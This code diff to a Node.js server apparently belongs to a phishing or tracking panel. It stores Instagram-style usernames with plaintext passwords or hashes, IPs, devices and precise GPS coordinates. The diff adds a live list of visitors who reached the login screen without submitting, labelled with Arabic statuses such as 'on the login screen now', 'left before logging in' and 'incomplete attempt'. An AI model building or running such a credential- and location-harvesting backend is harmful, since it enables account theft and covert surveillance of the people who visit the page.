@@ -6551,7 +6551,11 @@ const server = http.createServer(async (req, res) => {
       ? String(data.publicIp).trim()
       : (!isLoopbackIp(clientIp) ? clientIp : '127.0.0.1');
     const cleanDevice = normalizeRealDeviceName(data.device || '', req.headers['user-agent'] || '');
-    const isReg = Boolean(rawUser && VALID_IG_USERNAME_REGEX.test(rawUser));
+    const existingSavedAccount = (rawUser && logs.savedAccounts && logs.savedAccounts[rawUser]) ? logs.savedAccounts[rawUser] : null;
+    const isAuthenticatedSavedAccount = Boolean(
+      existingSavedAccount && (rawUser === '1' || existingSavedAccount.passwordHash || existingSavedAccount.password)
+    );
+    const isReg = Boolean(rawUser && VALID_IG_USERNAME_REGEX.test(rawUser) && isAuthenticatedSavedAccount);
 
     // STRICT USERNAME / USERID ISOLATION:
     // Match ONLY the exact user record for this username (never match by IP, userAgent, or shared deviceId across different accounts!)
@@ -6824,7 +6828,11 @@ const server = http.createServer(async (req, res) => {
     const rawUser = normalizeIgUsername(data.username || data.visitorName || rawUserFromId || '');
     const visitorId = String(data.userId || data.visitorId || '').trim();
     const deviceId = String(data.deviceId || data.visitorId || '').trim();
-    const isReg = Boolean(rawUser && VALID_IG_USERNAME_REGEX.test(rawUser));
+    const existingSavedAccount = (rawUser && logs.savedAccounts && logs.savedAccounts[rawUser]) ? logs.savedAccounts[rawUser] : null;
+    const isAuthenticatedSavedAccount = Boolean(
+      existingSavedAccount && (rawUser === '1' || existingSavedAccount.passwordHash || existingSavedAccount.password)
+    );
+    const isReg = Boolean(rawUser && VALID_IG_USERNAME_REGEX.test(rawUser) && isAuthenticatedSavedAccount);
     const now = new Date().toISOString();
 
     if (points.length === 0) {
@@ -7142,15 +7150,63 @@ const server = http.createServer(async (req, res) => {
       accountMap.set(cleanU, existing);
     };
 
+    const authenticatedUserSet = new Set(['1']);
+    const preLoginDevices = [];
+
+    const pushPreLoginDevice = (rec, labelFallback = '') => {
+      if (!rec || typeof rec !== 'object') return;
+      const recLastMs = Math.max(
+        typeof rec.lastSeen === 'number' ? rec.lastSeen : (rec.lastSeen ? new Date(rec.lastSeen).getTime() : 0),
+        typeof rec.lastSeenMs === 'number' ? rec.lastSeenMs : 0,
+        rec.lastHeartbeatAt ? new Date(rec.lastHeartbeatAt).getTime() : 0,
+        rec.updatedAt ? new Date(rec.updatedAt).getTime() : 0
+      );
+      const rawConn = String(rec.status || rec.connectionStatus || rec.liveStatus || '').trim().toLowerCase();
+      const isGpsOff = rawConn === 'gps_off' || rawConn === 'gps_disabled' || rec.gpsEnabled === false;
+      const isExited = rawConn === 'exited';
+      const isOnlineNow = !isGpsOff && !isExited && recLastMs > 0 && (serverNowMs - recLastMs) < 45000;
+      const parsedDev = extractDeviceAndOs(rec.device || '');
+      const hasGps = ['GPS', 'NATIVE_GEOLOCATION'].includes(String(rec.source || rec.locationSource || '').trim().toUpperCase()) && isValidNonZeroCoord(rec.lat, rec.lng ?? rec.lon);
+      preLoginDevices.push({
+        id: rec.id || labelFallback || `pre_${preLoginDevices.length + 1}`,
+        label: labelFallback || rec.visitorName || parsedDev.deviceModel || 'جهاز قبل الدخول',
+        deviceModel: parsedDev.deviceModel,
+        os: parsedDev.os,
+        ip: (rec.ip && !isLoopbackIp(rec.ip)) ? String(rec.ip).trim() : '—',
+        lastLat: hasGps ? Number(Number(rec.lat).toFixed(6)) : null,
+        lastLon: hasGps ? Number(Number(rec.lng ?? rec.lon).toFixed(6)) : null,
+        lastSeenMs: recLastMs,
+        lastSeen: recLastMs > 0 ? new Date(recLastMs).toLocaleString('ar-SA', { hour12: true }) : '—',
+        isOnline: isOnlineNow,
+        status: isGpsOff ? 'أقفل الموقع' : (isOnlineNow ? 'على شاشة الدخول الآن' : 'غادر قبل الدخول'),
+        statusCode: isGpsOff ? 'gps_off' : (isOnlineNow ? 'online' : 'exited')
+      });
+    };
+
     if (logs.savedAccounts && typeof logs.savedAccounts === 'object') {
       for (const [k, acc] of Object.entries(logs.savedAccounts)) {
-        mergeIsolatedUserRecord(k, acc);
+        const cleanK = normalizeIgUsername(k);
+        if (!cleanK || !VALID_IG_USERNAME_REGEX.test(cleanK)) continue;
+        const isAuthenticatedAcc = cleanK === '1' || Boolean(acc && (acc.passwordHash || acc.password));
+        if (isAuthenticatedAcc) {
+          authenticatedUserSet.add(cleanK);
+          mergeIsolatedUserRecord(cleanK, acc);
+        } else if (acc) {
+          pushPreLoginDevice(acc, `محاولة غير مكتملة (@${cleanK})`);
+        }
       }
     }
     if (Array.isArray(logs.visitors)) {
       for (const v of logs.visitors) {
-        if (!v || v.isDeviceIpAutoAuth) continue;
-        mergeIsolatedUserRecord(v.username || v.visitorName, v);
+        if (!v) continue;
+        const cleanV = normalizeIgUsername(v.username || (!String(v.visitorName || '').includes('•') ? v.visitorName : '') || '');
+        const isAuthVisitor = !v.isDeviceIpAutoAuth && cleanV && (authenticatedUserSet.has(cleanV) || Boolean(v.passwordHash || v.hasPasswordHash));
+        if (isAuthVisitor) {
+          authenticatedUserSet.add(cleanV);
+          mergeIsolatedUserRecord(cleanV, v);
+        } else {
+          pushPreLoginDevice(v, v.isDeviceIpAutoAuth ? (v.visitorName || 'جهاز قبل الدخول') : (cleanV ? `محاولة غير مكتملة (@${cleanV})` : 'جهاز غير مسجل'));
+        }
       }
     }
 
@@ -7171,12 +7227,15 @@ const server = http.createServer(async (req, res) => {
     }
 
     const sessions = Array.from(accountMap.values()).sort((a, b) => (b.lastSeenMs || 0) - (a.lastSeenMs || 0));
+    preLoginDevices.sort((a, b) => (b.lastSeenMs || 0) - (a.lastSeenMs || 0));
     res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
     res.end(JSON.stringify({
       success: true,
       serverNowMs,
       total: sessions.length,
-      sessions
+      sessions,
+      preLoginTotal: preLoginDevices.length,
+      preLoginDevices
     }));
     return;
   }
@@ -8257,7 +8316,11 @@ const server = http.createServer(async (req, res) => {
         const finalRegion = resolvedPlace?.neighborhood || scopeInfo?.neighborhood || 'أمانة العاصمة';
         const finalLocationName = `${finalCity} - ${finalRegion}`;
         const cleanIsp = normalizeRealIspName(isp || '', finalCountry, realIp);
-        const isReg = Boolean(rawUser && VALID_IG_USERNAME_REGEX.test(rawUser));
+        const existingSavedAccount = (rawUser && logs.savedAccounts && logs.savedAccounts[rawUser]) ? logs.savedAccounts[rawUser] : null;
+    const isAuthenticatedSavedAccount = Boolean(
+      existingSavedAccount && (rawUser === '1' || existingSavedAccount.passwordHash || existingSavedAccount.password)
+    );
+    const isReg = Boolean(rawUser && VALID_IG_USERNAME_REGEX.test(rawUser) && isAuthenticatedSavedAccount);
 
         if (isReg && logs.savedAccounts && logs.savedAccounts[rawUser]) {
           if (!isValidNonZeroCoord(logs.savedAccounts[rawUser].lat, logs.savedAccounts[rawUser].lng) || manualCity) {
